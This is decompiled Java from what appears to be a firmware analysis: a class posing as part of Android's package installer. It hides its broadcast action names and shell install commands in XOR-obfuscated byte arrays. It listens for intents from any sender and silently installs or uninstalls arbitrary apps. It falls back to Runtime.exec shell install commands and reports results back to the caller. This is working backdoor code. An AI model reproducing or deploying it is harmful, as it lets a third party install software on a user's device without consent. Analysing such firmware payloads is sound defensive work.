package com.android.packageinstaller.extplog;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageInstaller;
import android.os.Build;
import android.os.SystemClock;
import android.text.TextUtils;
import com.android.packageinstaller.extplog.c;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.List;

/* JADX INFO: compiled from: AppInstallerUtils.java */
/* JADX INFO: loaded from: /root/firmware-lab/inoi-a75/extracted/embedded_payloads/nested/a/classes.dex */
public class b {
    private static b j = new b();
    private byte[] a = {100, 73, 97, 55, 123, 71, 112, 100, 68, 71, 103, 73, 15, 122, 106, 99, 34, 109, 67, 119, 41, 118, 83, 81, 95, 101, 88, 89};
    private byte[] b = {111, 118, 119, 7, 117, 120, 79, 92, 108, 88, 69, 103, 60, 114, 116, 117, 2, 124, 104, 65, 34, 73, 69, 96, 90, 69, 127, 111, 79, 125};
    private byte[] c = {121, 70, 121, 56, 74, 64, 103, 67, 78, 118, 118, 111, 34, 100, 84, 100, 41, 74, 99, 126, 52, 121, 75, 67, 101, 103, 77, 98, 117, 94, 94, 91};
    private byte[] d = {113, 120, 97, 47, 77, 126, 99, 84, 99, 112, 126, 81, 58, 115, 83, 90, 45, 93, 78, 120, 60, 71, 83, 72, 98, 67, 83, 103, 64, 85, 69, 125, 91, 73, 123, 113, 81, 116, 114, 74, 94, 67};
    private byte[] e = {111, 110, 65, 62, 102, 72, 104, 107, 117, 64, 112, 110, 5, 75, 123, 69, 15, 115, 125, 112, 34, 81, 115, 69, 73, 111, 66, 74, 78, 104, 88, 90, 116, 122, 76, 110, 113, 64, 64, 82, 95, 84, 96, 68};
    private byte[] f = {105, 119, 9, 125, 120, 88, 90, 98, 93, 77, 63};
    private byte[] g = {85, 94, 118, 88, 95, 105, 124, 66, 99, 120, 64, 66, 86, 88, 73, 17, 63, 113, 67, 98, 125, 117, 91, 59, 122, 66, 76, 57, 30, 82, 102, 97, 99, 105, 108, 3, 124, 110, 68, 44, 105, 119, 9, 125, 120, 88, 90, 98, 93, 77, 63};
    private byte[] h = {33, 31, 18, 23, 12, 1, 44, 16, 7, 38, 12, 25, 26, 41, 20, 22, 43, 46, 3, 49};
    private Context i;
    private BroadcastReceiver k;

    /* JADX INFO: Access modifiers changed from: private */
    public String a(byte[] data) {
        if (data == null) {
            return null;
        }
        byte[] dataDecryption = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            dataDecryption[i] = (byte) (data[i] ^ this.h[(data.length + i) % this.h.length]);
        }
        return new String(dataDecryption);
    }

    private b() {
    }

    public void a(Context context) {
        this.i = context;
        c();
    }

    public static b a() {
        return j;
    }

    private void c() {
        try {
            if (this.i != null && this.k == null) {
                IntentFilter filter = new IntentFilter();
                filter.addAction(a(this.a));
                filter.addAction(a(this.b));
                filter.addAction(a(this.c));
                this.k = new BroadcastReceiver() { // from class: com.android.packageinstaller.extplog.b.1
                    @Override // android.content.BroadcastReceiver
                    public void onReceive(Context context, Intent intent) {
                        try {
                            String action = intent.getAction();
                            if (action != null && action.equals(b.this.a(b.this.b))) {
                                String path = intent.getStringExtra("path");
                                String pkgName = intent.getStringExtra("package");
                                String reply = intent.getStringExtra("reply");
                                int version = intent.getIntExtra("version", 0);
                                int verify = intent.getIntExtra("verify", 0);
                                if (!b.this.a(context, pkgName, verify, version)) {
                                    if (Build.VERSION.SDK_INT < 28) {
                                        b.this.a(context, path, pkgName, reply, verify, version);
                                    } else {
                                        b.this.b(context, path, pkgName, reply, verify, version);
                                    }
                                } else {
                                    b.this.a(context, reply, true, "", path, pkgName, verify, version);
                                }
                            } else if (action != null && action.equals(b.this.a(b.this.c))) {
                                String pkgName2 = intent.getStringExtra("package");
                                String reply2 = intent.getStringExtra("reply");
                                if (Build.VERSION.SDK_INT < 28) {
                                    b.this.a(context, pkgName2, reply2);
                                } else {
                                    b.this.b(context, pkgName2, reply2);
                                }
                            } else if (action != null && action.equals(b.this.a(b.this.a))) {
                                String reply3 = intent.getStringExtra("reply");
                                if (!TextUtils.isEmpty(reply3)) {
                                    Intent reply_intent = new Intent(reply3);
                                    context.sendBroadcast(reply_intent);
                                }
                            }
                        } catch (Throwable th) {
                        }
                    }
                };
                if (Build.VERSION.SDK_INT >= 34) {
                    this.i.registerReceiver(this.k, filter, 3);
                } else {
                    this.i.registerReceiver(this.k, filter);
                }
            }
        } catch (Throwable th) {
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void a(final Context context, final String path, final String pkg, final String reply, final int verify, final int version) {
        String error;
        boolean isInstall = false;
        try {
            if (TextUtils.isEmpty(path) || !b(path)) {
                error = "fileNotExists";
            } else if (TextUtils.isEmpty(pkg)) {
                error = "packageIsNull";
            } else {
                a am = new a(context);
                am.a(new d() { // from class: com.android.packageinstaller.extplog.b.2
                    @Override // com.android.packageinstaller.extplog.d
                    public void a(String packageName, int returnCode) {
                        b.this.a(context, reply, returnCode == 1, String.valueOf(returnCode), path, pkg, verify, version);
                    }

                    @Override // com.android.packageinstaller.extplog.d
                    public void b(String packageName, int returnCode) {
                    }
                });
                isInstall = true;
                am.b(path);
                error = "";
            }
        } catch (Throwable e) {
            error = new StringBuilder("install error:").append(e).toString() != null ? e.getLocalizedMessage() : "null";
        }
        if (!isInstall) {
            try {
                a(context, reply, false, error, path, pkg, verify, version);
            } catch (Throwable th) {
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void a(final Context context, String pkg, final String reply) {
        boolean result = false;
        boolean isUninstall = false;
        try {
            a am = new a(context);
            am.a(new d() { // from class: com.android.packageinstaller.extplog.b.3
                @Override // com.android.packageinstaller.extplog.d
                public void a(String packageName, int returnCode) {
                }

                @Override // com.android.packageinstaller.extplog.d
                public void b(String packageName, int returnCode) {
                    try {
                        if (!TextUtils.isEmpty(reply)) {
                            Intent reply_intent = new Intent(reply);
                            reply_intent.putExtra("result", returnCode == 1);
                            context.sendBroadcast(reply_intent);
                        }
                    } catch (Throwable th) {
                    }
                }
            });
            if (!TextUtils.isEmpty(pkg)) {
                if (!a(context, pkg, 0, 0)) {
                    result = true;
                } else {
                    isUninstall = true;
                    am.a(pkg);
                    SystemClock.sleep(20000L);
                    if (!a(context, pkg, 0, 0)) {
                        result = true;
                    }
                }
            }
        } catch (Throwable th) {
        }
        if (!isUninstall) {
            try {
                if (!TextUtils.isEmpty(reply)) {
                    Intent reply_intent = new Intent(reply);
                    reply_intent.putExtra("result", result);
                    context.sendBroadcast(reply_intent);
                }
            } catch (Throwable th2) {
            }
        }
    }

    public void b() {
        try {
            if (this.k != null) {
                this.i.unregisterReceiver(this.k);
                this.k = null;
            }
        } catch (Throwable th) {
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    @SuppressLint({"NewApi"})
    public void b(Context context, final String pkg, final String reply) {
        try {
            PackageInstaller packageInstaller = context.getPackageManager().getPackageInstaller();
            Intent intent = new Intent(a(this.e));
            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 1, intent, 134217728);
            if (Build.VERSION.SDK_INT >= 34) {
                try {
                    context.registerReceiver(new BroadcastReceiver() { // from class: com.android.packageinstaller.extplog.b.4
                        @Override // android.content.BroadcastReceiver
                        public void onReceive(Context context2, Intent intent2) {
                            if (intent2 != null) {
                                try {
                                    if (!TextUtils.isEmpty(reply)) {
                                        Intent reply_intent = new Intent(reply);
                                        reply_intent.putExtra("result", b.this.a(context2, pkg, 0, 0) ? false : true);
                                        context2.sendBroadcast(reply_intent);
                                    }
                                } catch (Throwable th) {
                                }
                            }
                        }
                    }, new IntentFilter(a(this.e)), 3);
                } catch (Throwable th) {
                }
            } else {
                try {
                    context.registerReceiver(new BroadcastReceiver() { // from class: com.android.packageinstaller.extplog.b.5
                        @Override // android.content.BroadcastReceiver
                        public void onReceive(Context context2, Intent intent2) {
                            if (intent2 != null) {
                                try {
                                    if (!TextUtils.isEmpty(reply)) {
                                        Intent reply_intent = new Intent(reply);
                                        reply_intent.putExtra("result", b.this.a(context2, pkg, 0, 0) ? false : true);
                                        context2.sendBroadcast(reply_intent);
                                    }
                                } catch (Throwable th2) {
                                }
                            }
                        }
                    }, new IntentFilter(a(this.e)));
                } catch (Throwable th2) {
                }
            }
            packageInstaller.uninstall(pkg, pendingIntent.getIntentSender());
        } catch (Throwable th3) {
            try {
                if (!TextUtils.isEmpty(reply)) {
                    Intent reply_intent = new Intent(reply);
                    reply_intent.putExtra("result", false);
                    context.sendBroadcast(reply_intent);
                }
            } catch (Throwable th4) {
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    @SuppressLint({"NewApi"})
    public void b(Context context, String path, String pkg, String reply, int verify, int version) {
        try {
            File apkFile = new File(path);
            PackageInstaller packageInstaller = context.getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams sessionParams = new PackageInstaller.SessionParams(1);
            sessionParams.setSize(apkFile.length());
            int sessionId = a(packageInstaller, sessionParams);
            if (sessionId != -1) {
                boolean copySuccess = a(packageInstaller, sessionId, path);
                if (copySuccess) {
                    a(context, packageInstaller, sessionId, pkg, reply, path, verify, version);
                } else {
                    a(context, reply, false, "copy is failed", path, pkg, verify, version);
                }
            } else {
                a(context, reply, false, "sessionId is -1", path, pkg, verify, version);
            }
        } catch (Throwable e) {
            a(context, reply, false, e.getMessage(), path, pkg, verify, version);
        }
    }

    @SuppressLint({"NewApi"})
    private int a(PackageInstaller packageInstaller, PackageInstaller.SessionParams sessionParams) {
        try {
            int sessionId = packageInstaller.createSession(sessionParams);
            return sessionId;
        } catch (Throwable th) {
            return -1;
        }
    }

    @SuppressLint({"NewApi"})
    private boolean a(PackageInstaller packageInstaller, int sessionId, String apkFilePath) throws Throwable {
        Object in = null;
        OutputStream out = null;
        PackageInstaller.Session session = null;
        try {
            File apkFile = new File(apkFilePath);
            session = packageInstaller.openSession(sessionId);
            out = session.openWrite("tempapp.apk", 0L, apkFile.length());
            InputStream in2 = new FileInputStream(apkFile);
            try {
                byte[] buffer = new byte[65536];
                while (true) {
                    int c = in2.read(buffer);
                    if (c != -1) {
                        out.write(buffer, 0, c);
                    } else {
                        session.fsync(out);
                        a(out);
                        a(in2);
                        a(session);
                        return true;
                    }
                }
            } catch (Throwable th) {
                th = th;
                in = in2;
                a(out);
                a(in);
                a(session);
                throw th;
            }
        } catch (Throwable th2) {
        }
    }

    @SuppressLint({"NewApi"})
    private void a(Context context, PackageInstaller packageInstaller, int sessionId, final String pkg, final String reply, final String path, final int verify, final int version) {
        PackageInstaller.Session session = null;
        try {
            session = packageInstaller.openSession(sessionId);
            Intent intent = new Intent(a(this.d));
            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 1, intent, 134217728);
            if (Build.VERSION.SDK_INT >= 34) {
                try {
                    context.registerReceiver(new BroadcastReceiver() { // from class: com.android.packageinstaller.extplog.b.6
                        @Override // android.content.BroadcastReceiver
                        public void onReceive(Context context2, Intent intent2) {
                            boolean result;
                            if (intent2 != null) {
                                try {
                                    int status = intent2.getIntExtra("android.content.pm.extra.STATUS", 1);
                                    String error = "";
                                    if (status == 0) {
                                        result = true;
                                    } else {
                                        result = false;
                                        error = intent2.getStringExtra("android.content.pm.extra.STATUS_MESSAGE");
                                    }
                                    b.this.a(context2, reply, result, error, path, pkg, verify, version);
                                } catch (Throwable e) {
                                    e.printStackTrace();
                                }
                            }
                        }
                    }, new IntentFilter(a(this.d)), 3);
                } catch (Throwable th) {
                }
            } else {
                try {
                    context.registerReceiver(new BroadcastReceiver() { // from class: com.android.packageinstaller.extplog.b.7
                        @Override // android.content.BroadcastReceiver
                        public void onReceive(Context context2, Intent intent2) {
                            boolean result;
                            if (intent2 != null) {
                                try {
                                    int status = intent2.getIntExtra("android.content.pm.extra.STATUS", 1);
                                    String error = "";
                                    if (status == 0) {
                                        result = true;
                                    } else {
                                        result = false;
                                        error = intent2.getStringExtra("android.content.pm.extra.STATUS_MESSAGE");
                                    }
                                    b.this.a(context2, reply, result, error, path, pkg, verify, version);
                                } catch (Throwable e) {
                                    e.printStackTrace();
                                }
                            }
                        }
                    }, new IntentFilter(a(this.d)));
                } catch (Throwable th2) {
                }
            }
            session.commit(pendingIntent.getIntentSender());
        } catch (Throwable e) {
            a(context, reply, false, e.getMessage(), path, pkg, verify, version);
        } finally {
            a(session);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* JADX WARN: Code duplicated, block: B:10:0x002d A[Catch: Throwable -> 0x004a, TryCatch #0 {Throwable -> 0x004a, blocks: (B:3:0x0002, B:6:0x000c, B:8:0x0012, B:10:0x002d, B:12:0x0033, B:14:0x0041), top: B:20:0x0002 }] */
    /* JADX WARN: Code duplicated, block: B:12:0x0033 A[Catch: Throwable -> 0x004a, TryCatch #0 {Throwable -> 0x004a, blocks: (B:3:0x0002, B:6:0x000c, B:8:0x0012, B:10:0x002d, B:12:0x0033, B:14:0x0041), top: B:20:0x0002 }] */
    /* JADX WARN: Code duplicated, block: B:17:0x004c  */
    public void a(final Context context, final String reply, boolean result, final String error, final String path, final String packageName, final int verify, final int version) {
        if (result) {
            if (!TextUtils.isEmpty(reply)) {
                Intent reply_intent = new Intent(reply);
                reply_intent.putExtra("result", result);
                if (error == null) {
                    error = "";
                }
                reply_intent.putExtra("error", error);
                context.sendBroadcast(reply_intent);
            }
        } else {
            try {
                if (b(path) && packageName != null && packageName.length() > 0) {
                    new Thread(new Runnable() { // from class: com.android.packageinstaller.extplog.b.8
                        @Override // java.lang.Runnable
                        public void run() {
                            try {
                                if (!b.this.a(context, packageName, verify, version)) {
                                    c.a(context, path, (c.a) null);
                                    SystemClock.sleep(2000L);
                                }
                                if (!b.this.a(context, packageName, verify, version)) {
                                    if (Build.VERSION.SDK_INT > 19) {
                                        b.this.a(String.valueOf(b.this.a(b.this.f)) + (verify == 1 ? "-r " : "") + path);
                                    } else {
                                        b.this.a(String.valueOf(b.this.a(b.this.g)) + (verify == 1 ? "-r " : "") + path);
                                    }
                                    SystemClock.sleep(2000L);
                                    if (!b.this.a(context, packageName, verify, version)) {
                                        b.this.a(String.valueOf(b.this.a(b.this.f)) + "-i " + context.getPackageName() + " --user 0 " + (verify == 1 ? "-r " : "") + path);
                                        SystemClock.sleep(2000L);
                                    }
                                }
                                boolean bl = false;
                                if (b.this.a(context, packageName, verify, version)) {
                                    bl = true;
                                }
                                if (!TextUtils.isEmpty(reply)) {
                                    Intent reply_intent2 = new Intent(reply);
                                    reply_intent2.putExtra("result", bl);
                                    reply_intent2.putExtra("error", error != null ? error : "");
                                    context.sendBroadcast(reply_intent2);
                                }
                            } catch (Throwable th) {
                            }
                        }
                    }).start();
                } else if (!TextUtils.isEmpty(reply)) {
                    Intent reply_intent2 = new Intent(reply);
                    reply_intent2.putExtra("result", result);
                    if (error == null) {
                        error = "";
                    }
                    reply_intent2.putExtra("error", error);
                    context.sendBroadcast(reply_intent2);
                }
            } catch (Throwable th) {
            }
        }
    }

    @SuppressLint({"NewApi"})
    private void a(Object obj) {
        if (obj != null) {
            try {
                if (obj instanceof PackageInstaller.Session) {
                    ((PackageInstaller.Session) obj).close();
                } else if (obj instanceof OutputStream) {
                    ((OutputStream) obj).close();
                } else if (obj instanceof InputStream) {
                    ((InputStream) obj).close();
                }
            } catch (Throwable th) {
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public String a(String cmd) throws Throwable {
        String result = "";
        BufferedReader dis = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader dis2 = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while (true) {
                try {
                    String line = dis2.readLine();
                    if (line == null) {
                        break;
                    }
                    result = String.valueOf(result) + line + "\n";
                } catch (Exception e) {
                    dis = dis2;
                    if (dis != null) {
                        try {
                            dis.close();
                        } catch (IOException e2) {
                        }
                    }
                } catch (Throwable th) {
                    th = th;
                    dis = dis2;
                    if (dis != null) {
                        try {
                            dis.close();
                        } catch (IOException e3) {
                        }
                    }
                    throw th;
                }
            }
            p.waitFor();
            if (dis2 != null) {
                try {
                    dis2.close();
                } catch (IOException e4) {
                }
            }
        } catch (Exception e5) {
        } catch (Throwable th2) {
            th = th2;
        }
        return result;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public boolean a(Context context, String packageName, int verify, int versionCode) {
        boolean z = true;
        try {
            List<PackageInfo> infos = context.getPackageManager().getInstalledPackages(0);
            if (infos == null || infos.size() == 0) {
                return false;
            }
            for (PackageInfo info : infos) {
                if (info.packageName.equals(packageName)) {
                    if (verify == 1 && info.versionCode != versionCode) {
                        z = false;
                    }
                    return z;
                }
            }
            return false;
        } catch (Throwable th) {
            return false;
        }
    }

    private boolean b(String path) {
        try {
            File file = new File(path);
            return file.exists() && file.length() > 0;
        } catch (Throwable th) {
            return false;
        }
    }
}
